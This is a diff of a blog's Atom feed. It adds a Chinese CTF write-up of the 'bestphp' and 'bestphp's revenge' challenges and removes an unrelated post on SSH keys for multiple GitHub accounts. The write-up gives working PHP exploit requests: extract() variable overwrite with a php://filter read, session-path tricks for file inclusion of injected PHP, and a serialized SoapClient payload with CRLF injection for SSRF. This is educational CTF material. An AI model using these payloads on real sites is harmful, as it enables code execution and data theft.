@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-08-30T05:24:16.937Z</updated>
+  <updated>2019-08-31T13:49:49.341Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2018-Xctf Final &amp; bestphp-revenge</title>
+    <link href="http://yoursite.com/2019/08/31/2018-Xctf%20Final%20&amp;%20bestphp-revenge/"/>
+    <id>http://yoursite.com/2019/08/31/2018-Xctf Final &amp; bestphp-revenge/</id>
+    <published>2019-08-31T13:49:49.000Z</published>
+    <updated>2019-08-31T13:49:49.341Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="bestphp"><a href="#bestphp" class="headerlink" title="bestphp"></a>bestphp</h2><p>考点：变量覆盖+lfi+session文件转移<br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&apos;open_basedir&apos;, &apos;C:/www/t/830&apos;);</span><br><span class="line">$file = &apos;function.php&apos;;</span><br><span class="line">$func = isset($_GET[&apos;function&apos;]) ? $_GET[&apos;function&apos;] : &apos;filters&apos;;</span><br><span class="line">call_user_func($func, $_GET);</span><br><span class="line">include $file;</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;name&apos;] = $_POST[&apos;name&apos;];</span><br><span class="line">if ($_SESSION[&apos;name&apos;] == &apos;admin&apos;) &#123;</span><br><span class="line">header(&apos;location:admin.php&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关键代码在<code>call_user_func</code>，第二个参数为<code>$_GET</code>数组，我们无法控制<code>$_GET</code>整个的值，但是能控制其键和名，可以想到使用变量覆盖<code>extract</code>函数覆盖file值，进行文件包含。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>可以看到function.php和admin.php源码，但用处不大</p><p>open_basedir被限制了，可以通过<code>session_start</code>的参数选项进行修改session文件存储位置<br><img src="/img/1567235922169.png" alt="">，同样配置参数的第二个选项也是使用数组，因此也能配置。<br>但是options方式只有在php7.0以上才支持。</p><p>因此我们的思路：先通过session_start修改session文件位置，通过POST传递name控制SESSION文件内容，利用extract控制file变量进行文件包含。<br>第一步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?function=session_start&amp;save_path=C:\www\t\830</span><br><span class="line">name=&lt;?=phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><p>第二步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=extract&amp;file=C:\www\t\830\sess_7c2nmq4a93e9k3adi32b647a31</span><br></pre></td></tr></table></figure></p><p><img src="/img/1567237317824.png" alt=""></p><h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>考点：soap ssrf+session 反序列化+变量覆盖+session_start小技巧<br>环境搭建了一天还是没搞好，还是记录一下<br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure></p><p>flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">echo &apos;only localhost can get flag!&apos;;</span><br><span class="line">$flag = &apos;LCTF&#123;*************************&#125;&apos;;if ($_SERVER[&quot;REMOTE_ADDR&quot;] === &quot;127.0.0.1&quot;) &#123;$_SESSION[&apos;flag&apos;] = $flag;&#125;</span><br></pre></td></tr></table></figure></p><p>题目意思就是需要通过本地ip来访问flag.php，大体思路就是制造SSRF。<br>通过<code>session_start</code>和<code>call_user_func</code>我们可以利用前一题的思路，利用<code>session_start</code>的参数<code>serialize_handler=php_serialize</code>使得传入和解析session方式不同，就能制造出session反序列化漏洞</p><p>那么构造什么类，可以利用php内置类SoapClient来进行SSRF攻击，触发SSRF，需要类中的<code>__call</code>函数来触发，而要触发<code>__call</code>需要访问类中不存在的方法</p><p>如何访问不存在的方法，需要第二次请求，利用第一个<code>call_user_func</code>进行变量覆盖，将<code>$b</code>覆盖为<code>call_user_func</code>来访问方法，而将<code>$_SESSION[name]</code>赋值为<code>SoapClient</code>就能够对该对象的静态方法<code>welcome_to_the_lctf2018</code>进行访问，实际是对<code>__call</code>函数访问。</p><p>第一次请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.104/t/830/bestphp/?name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A39%3A%22http%3A%2F%2F127.0.0.1%2Ft%2F830%2Fbestphp%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3D2bijd8knc92gvbfjrhs34tr2v2%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;f=session_start</span><br><span class="line"></span><br><span class="line">serialize_handler=php_serialize</span><br></pre></td></tr></table></figure></p><p>第二次请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.104/t/830/bestphp/?name=Soapclient&amp;f=extract</span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;bestphp&quot;&gt;&lt;a href=&quot;#bestphp&quot; class=&quot;headerlink&quot; title=&quot;bestphp&quot;&gt;&lt;/a&gt;bestphp&lt;/h2&gt;&lt;p&gt;考点：变量覆盖+lfi+session文件转移&lt;br&gt;代码：&lt;br&gt;&lt;figure class=&quot;h
+      
+    
+    </summary>
+    
+      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
+    
+    
+      <category term="other" scheme="http://yoursite.com/tags/other/"/>
+    
+  </entry>
   
   <entry>
     <title>session.upload_progress的利用</title>
@@ -493,31 +518,6 @@
     
     
       <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>同一台电脑连接多个github仓库</title>
-    <link href="http://yoursite.com/2019/02/03/%E5%90%8C%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E5%A4%9A%E4%B8%AAgithub%E4%BB%93%E5%BA%93/"/>
-    <id>http://yoursite.com/2019/02/03/同一台电脑连接多个github仓库/</id>
-    <published>2019-02-03T08:42:16.000Z</published>
-    <updated>2019-05-13T12:46:30.686Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x01-生成密钥"><a href="#0x01-生成密钥" class="headerlink" title="0x01.生成密钥"></a>0x01.生成密钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;yourname@email.com&quot;</span><br></pre></td></tr></table></figure><p>分别生成两次公钥，可以得到两组公钥和私钥</p><h2 id="0x02-在github上添加公钥"><a href="#0x02-在github上添加公钥" class="headerlink" title="0x02. 在github上添加公钥"></a>0x02. 在github上添加公钥</h2><p>不解释</p><h2 id="0x03-添加config配置文件"><a href="#0x03-添加config配置文件" class="headerlink" title="0x03. 添加config配置文件"></a>0x03. 添加config配置文件</h2><p>在.ssh文件夹下添加config文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#第一个账号 Bu1uokage</span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">#第二个账号 K4ge</span><br><span class="line">Host K4ge</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_K4ge</span><br></pre></td></tr></table></figure></p><p>说明：</p><ol><li>Host 可以是自定义的随机别名，如<code>K4ge</code>，在后面clone时会用到</li><li>Hostname 就默认配置就好</li><li>User默认就使用git就好</li><li>IdentityFile即公钥对应目录</li></ol><h2 id="0x04-SSH连接"><a href="#0x04-SSH连接" class="headerlink" title="0x04. SSH连接"></a>0x04. SSH连接</h2><p>如果出现Could not open a connection to your authentication agent错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash</span><br></pre></td></tr></table></figure></p><p>可以使用上述命令解决</p><p>添加ssh到agent中，<code>ssh-add -D</code>将agent中的删除，然后再依次添加。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-add id_rsa</span><br><span class="line">ssh-add id_rsa_K4ge</span><br><span class="line">ssh-add -l</span><br></pre></td></tr></table></figure></p><p>测试连接远程github服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">ssh -T K4ge</span><br></pre></td></tr></table></figure></p><h2 id="0x05-git实战"><a href="#0x05-git实战" class="headerlink" title="0x05. git实战"></a>0x05. git实战</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:K4ge/gitskills.git</span><br><span class="line">git remote rm origin</span><br><span class="line">git remote add origin git@K4ge:K4ge/gitksills.git</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;new README&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>先删除当前为github.com的remote<br>然后添加新的remote为K4ge，然后就可以push到新账号了。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;0x01-生成密钥&quot;&gt;&lt;a href=&quot;#0x01-生成密钥&quot; class=&quot;headerlink&quot; title=&quot;0x01.生成密钥&quot;&gt;&lt;/a&gt;0x01.生成密钥&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
-      
-    
-    </summary>
-    
-      <category term="other" scheme="http://yoursite.com/categories/other/"/>
-    
-    
-      <category term="other" scheme="http://yoursite.com/tags/other/"/>
     
   </entry>
   
